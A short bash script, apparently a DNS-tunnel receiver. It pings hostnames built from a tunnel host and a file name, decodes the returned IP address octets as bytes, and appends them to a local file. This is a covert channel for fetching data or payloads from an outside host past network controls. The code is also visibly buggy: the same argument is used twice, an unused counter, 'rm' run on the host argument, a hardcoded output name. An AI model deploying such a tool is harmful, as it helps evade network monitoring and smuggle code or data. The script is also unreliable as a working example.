#!/bin/bash
#
# dependencies: ping, bash, printf,   "./me.sh <dnstunnel host> <file>"
#
a=1
l=0
rm $1
while [ $a != [0] ]
do
 h=$(printf "sf.%d.%s.%s" $2 $2 $1)
 ip=$(ping -c1 -W1 $h | awk -F'[()]' '/PING/{print $2}')
 IFS=. read -r a b c d <<< "$ip"
 printf "%b%b%b" "`printf '\\\\x%02x\\\\x%02x\\\\x%02x' $b $c $d`" >> file
 ((l=l+3))
 echo .
done

